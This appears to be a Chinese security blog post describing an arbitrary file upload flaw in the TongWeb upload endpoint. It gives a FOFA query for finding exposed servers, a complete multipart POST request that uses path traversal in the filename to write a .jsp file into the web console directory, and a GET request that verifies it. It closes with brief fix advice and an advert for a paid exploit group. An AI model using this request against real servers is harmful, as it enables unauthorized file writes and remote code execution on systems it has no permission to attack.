#  东方通TongWeb upload接口存在任意文件上传漏洞  
原创 北雪网络安全
                    北雪网络安全  北雪网络安全   2026-10-07 13:54  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhazIeSYHOZKVsYC8icpic6lGBLtFhPCoicu4Ix1VGwsM4EBV56ia3Vh4TUWibicPHvuvbk1fY2VmcBHwrxSQAwBc3eficwp8ZRwPZ3DY/640?wx_fmt=png&from=appmsg "")  
  
盛世华诞 举国同庆  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzju7cneTqRA2etxPG4cRCO14ETzCbjzD1LaQo6p2bKY8cJaCEM97CoFmQSXpviaNGk65moB9CWcTMoeNVlGfq2AZkxmcIibXHTkQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzh2bDhV0EfCgQtxnjgDgs0C7n191XTIicqPKhI75BJzYdsAeNMlaZ7wJibKBkbOFNC6XRbnTRQ9m9CCZwibFOCYntTvB1zQHsGibN8/640?wx_fmt=png&from=appmsg "")  
  
山河锦绣，举国同庆。神州大地处处洋溢着热烈喜庆的氛围，我们致敬伟大祖国，感念岁月安好。愿万家喜乐，国泰民安，以赤诚之心，共赴时代崭新征程。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaannk2cVia5GjYCljlBgBpia30L8s9uelicQgrmicxicngibZGDvbyH5wSEve9hKnSCaGbib1h3wXSOiauLtXgiaY4fGqvVWDxtsWl7K9E/640?wx_fmt=png&from=appmsg "")  
  
  
  
**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**  
  
01  
  
更多内容  
  
#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296  
  
  
02  
  
搜索引擎  
  
  
fofa  
：  
app="  
东方通  
-TongWeb"  
  
  
  
03  
  
漏洞复现  
  
东方通  
TongWeb upload  
接口存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziaBS2Xz2lzfO12r6H9qA3ecK7slNdcvBWB5vwKq57jNYN0TerDLWcjBRXtgn2d0GR45V9Kk9LfNA3eeCntnqoy2AJFTjqOibyZM/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjxkleanrEAvzeib6VULdsl5k39x2VwgwCibNqEn40icJr0QmORZDHJpbAMSNnoBGWS54tcgG1sSJvW0fQBEbd6OoEH6QhzmO0xRU/640?wx_fmt=png&from=appmsg "")  
  
```
POST /heimdall/deploy/upload?method=upload HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Connection: keep-alive
Accept: */*
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs

------WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Disposition: form-data; name="file";
filename="../../applications/console/css/3dsspfldiks.jsp"
   
{{randstr_1}}
------WebKitFormBoundary8UaANmWAgM4BqBSs--
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhewD8r2PXxnaEqIicbPic83SIP9OgFZGyrcZQhARd1fsiaYndWxSl0xMrhAvmVtZhx7wsICC3HjNu7bLZgstWJadrafqoeblTQWw/640?wx_fmt=png&from=appmsg "")  
```
GET /console/css/3dsspfldiks.jsp HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjbsJEjAO4JrOtk6NTJzBTMnNojlvzYGwk2ibxzzDGNTTLwxetl02TESMtKribJuVD8annwYpgicmTMGDv9kwgvicN5nzJNIfDsdibs/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzh2cd2UicbpcVyUCd9yZ2MCsW5WeuW2Iw6z0MxzuTMN9BFZ8icn4EGPDHZxxaPPaLsaOrzw1A6H38FickjmrEW1MpibbdQkxKD9xM0/640?wx_fmt=png&from=appmsg "")  
  
  
  
04  
  
修复建议  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
05  
  
内部圈子  
  
🛠️   
【知名漏洞实战圈，纯干货】  
🛠️  
  
还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！  
目前已更新poc数量2500+  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaYDUMNuQyaBRU87ria0Nug1nI1kGBKvEkicArc1GzwYbdwXKmwLHiaTqMY1ISW4AbNs2qJF3ybNRiadW5CoYKyN66ThsXsF59micUc/640?wx_fmt=png&from=appmsg "")  
  
  
🎯 适用场景  
  
**▫️渗透测试▫️企业漏洞自查▫️攻防演练▫️安全服务▫️合规运营**  
  
****  
  
**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**  
  
**▫️全民掌握网安技能，共守智能时代晴空。**  
  
  
  
